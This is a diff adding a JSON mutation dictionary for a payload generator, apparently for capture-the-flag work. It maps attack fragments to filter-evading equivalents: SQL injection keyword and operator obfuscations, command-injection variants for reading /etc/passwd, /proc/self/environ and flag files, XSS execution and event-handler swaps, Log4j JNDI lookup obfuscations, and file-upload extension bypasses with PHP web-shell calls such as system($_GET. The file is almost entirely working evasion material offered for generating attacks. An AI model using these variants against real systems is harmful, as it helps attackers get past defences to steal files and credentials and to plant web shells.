@@ -1,0 +1,110 @@
+{
+  "meta": {
+    "description": "同义近义词表 — 给 generator 的成功样本迭代用（同意图不同表达）。键=payload 中出现的字面子串，值=等价替代列表。来源：2026-08 联网检索 4 路合并。",
+    "version": 1
+  },
+  "sqli": {
+    "keywords": {
+      "UNION": ["UNION ALL", "UNION DISTINCT", "UN/*!*/ION", "UNIunionON", "UNION(SELECT)", "UN'ION'"],
+      "SELECT": ["SELECT(", "SEL/*!*/ECT", "SeLeCt", "/*!50000SELECT*/", "select-1.0"],
+      "AND": ["&&", "AND-", "AND+", "AND~", "AND!", "*"],
+      "OR": ["||", "OR+", "|"],
+      "NOT": ["!", "NOT!"],
+      "NULL": ["0", "false", "char(0x4e554c4c)", "(1*0)", "(SELECT 0)", "(0*1337-0)", "''"],
+      "FROM": ["FROM dual", "FROM (VALUES ROW(...))"],
+      "WHERE": ["HAVING", "GROUP BY"],
+      "ORDER BY": ["GROUP BY", "ORDER BY id+0", "ORDER BY (SELECT 1)"]
+    },
+    "operators": {
+      "1=1": ["1 LIKE 1", "1 REGEXP 1", "1 RLIKE 1", "2-1=1", "'a'='a'", "1 IN(1)", "1 BETWEEN 0 AND 2", "0x01=0x01", "1*1", "1+0", "1-0", "1&1", "~0", "!0"],
+      "=": [" LIKE ", " REGEXP ", " RLIKE ", " IN(", " BETWEEN ", " <> ", " <=> "],
+      ">": ["GREATEST(", "STRCMP("],
+      "<": ["LEAST(", "STRCMP("]
+    },
+    "functions": {
+      "SUBSTR": ["SUBSTRING", "MID", "LEFT", "RIGHT"],
+      "SUBSTRING": ["SUBSTR", "MID", "LEFT", "RIGHT"],
+      "ASCII": ["ORD", "HEX"],
+      "LENGTH": ["CHAR_LENGTH", "CHARACTER_LENGTH", "OCTET_LENGTH"],
+      "CONCAT": ["CONCAT_WS", "GROUP_CONCAT"],
+      "INSTR": ["LOCATE", "POSITION"],
+      "VERSION()": ["@@version"],
+      "USER()": ["@@user", "session_user()", "current_user()"],
+      "DATABASE()": ["SCHEMA()"],
+      "SLEEP": ["BENCHMARK(10000000,SHA1('x'))", "GET_LOCK('a',5)", "(SELECT SLEEP"]
+    },
+    "meta": {
+      "information_schema.tables": ["sys.schema_table_statistics_with_buffer", "mysql.innodb_table_stats", "information_schema . tables", "`information_schema`.`tables`"],
+      "information_schema.columns": ["(SELECT 1)a JOIN (SELECT 2)b", "no_column_name_tech"],
+      "flags": ["`flags`", "(SELECT flag FROM flags LIMIT 1)", "flag"]
+    }
+  },
+  "cmdi": {
+    "commands": {
+      "cat": ["tac", "nl", "rev", "grep '' ", "grep . ", "sort", "uniq", "strings", "more", "less", "head -n 100", "tail -n 100", "sed -n '1,100p'", "awk '1'", "od -An -c", "xxd", "hexdump -C", "fold -w 200", "cut -c1-100", "dd if=COUNT=1000", "base64 ", "readlink -f", "curl file:///"],
+      "ls": ["find . -maxdepth 1", "dir", "echo *", "ls -la"],
+      "whoami": ["id", "id -un", "id -u", "$(id -un)"],
+      "pwd": ["pwd -P", "echo $PWD", "${PWD}"],
+      "echo": ["printf '%s\\n'", "printenv"],
+      "grep": ["sed -n /p/p", "awk /p/", "rg"],
+      "sh -c": ["bash -c", "dash -c", "$SHELL -c", "$0 -c"],
+      "env": ["printenv", "cat /proc/self/environ"],
+      "base64": ["openssl base64 -d", "xxd -r -p"]
+    },
+    "paths": {
+      "/etc/passwd": ["/etc/./passwd", "/etc//passwd", "/etc/../etc/passwd", "/etc/pass[w]d", "/etc/pa??wd", "/et?/passwo?d", "/etc/pa\"\"sswd", "$PWD/../etc/passwd"],
+      "/flag": ["/f???", "/fl*", "$(pwd)/../flag", "/f*"],
+      "/etc/hostname": ["/etc/./hostname", "/etc//hostname", "/etc/hostna?e"]
+    },
+    "misc": {
+      "cat /etc/passwd": ["tac /etc/passwd", "grep '' /etc/passwd", "nl /etc/passwd"],
+      "id": ["id -un", "$(id)"]
+    }
+  },
+  "xss": {
+    "exec": {
+      "alert": ["confirm", "prompt", "top['al'+'ert']", "alert(document.domain)", "[].constructor.constructor('alert(1)')"],
+      "alert(1)": ["confirm(1)", "prompt(1)", "top['al'+'ert'](1)", "eval(atob('YWxlcnQoMSk='))", "String.fromCharCode(97,108,101,114,116,40,49,41)", "Function('alert(1)')()"],
+      "eval": ["Function", "[].constructor.constructor", "setTimeout", "setInterval"]
+    },
+    "events": {
+      "onerror": ["onload", "onfocus", "onmouseover", "onpointerenter", "ontoggle", "onauxclick", "onclick", "onscroll", "onstart", "onmouseenter", "ontouchstart", "onbeforetoggle", "onbeforematch", "onclose", "onbegin"]
+    },
+    "tags": {
+      "img": ["svg", "video", "iframe", "details", "input", "body", "marquee", "math", "noscript", "template", "a", "form", "xmp", "plaintext", "noembed", "keygen", "embed", "object", "source"],
+      "<script": ["<svg/onload", "<img/src", "<details/open", "<input/autofocus", "<video><source", "<iframe srcdoc", "<math><mtext", "<body onscroll"]
+    },
+    "proto": {
+      "javascript:": ["JaVaScRiPt:", "java\\tscript:", "java&#x73;cript:", "data:text/html,<script>alert(1)</script>", "vbscript:", "//javascript:"]
+    }
+  },
+  "log4j2": {
+    "lookup_prefix": {
+      "${lower:j}": ["${upper:j}", "${::-j}", "${env:NaN:-j}", "${sys:JAVA_HOME:-j}", "${date:'j'}"],
+      "${::-j}": ["${lower:j}", "${upper:j}", "${env:NaN:-j}", "${sys:X:-j}", "${date:'j'}"],
+      "${jndi:": ["${jnd${upper:ı}:", "${${lower:j}ndi:", "${${::-j}${::-n}${::-d}${::-i}:"]
+    },
+    "protocol": {
+      "ldap://": ["rmi://", "dns://", "iiop://", "ldaps://", "java:/", "ldap:127.0.0.1:1389/a"],
+      "ldap:": ["rmi:", "dns:", "iiop:", "ldaps:"]
+    },
+    "leak_prefix": {
+      "${env:": ["${sys:", "${java:", "${hostName}", "${bundle:", "${ctx:", "${main:", "${web:", "${docker:", "${k8s:", "${sd:", "${log4j:"]
+    }
+  },
+  "upload": {
+    "extension": {
+      ".php": [".php3", ".php4", ".php5", ".php7", ".php8", ".phtml", ".pht", ".phtm", ".phar", ".phps", ".pgif", ".php.", ".php ", ".pHp", ".php.jpg", ".jpg.php"],
+      ".jsp": [".jspx", ".jspa", ".jsw", ".jsv", ".jspf", ".jtml", ".wss", ".jSp", ".jsp/"],
+      ".asp": [".aspx", ".asa", ".cer", ".cdx", ".htr", ".soap", ".asp;.jpg"]
+    },
+    "tag": {
+      "<?=": ["<?php ", "<? ", "<script language=php>", "<% "],
+      "<?php": ["<?=", "<? ", "<script language=php>"]
+    },
+    "func": {
+      "system($_GET": ["passthru($_GET", "shell_exec($_GET", "exec($_GET", "popen($_GET", "proc_open($_GET", "eval($_POST", "assert($_REQUEST"],
+      "$f='sys'.'tem';$f(": ["$f=strrev('metsys');$f(", "$f=~urldecode('%9E%8C%8C%9A%93%9E');$f("]
+    }
+  }
+}
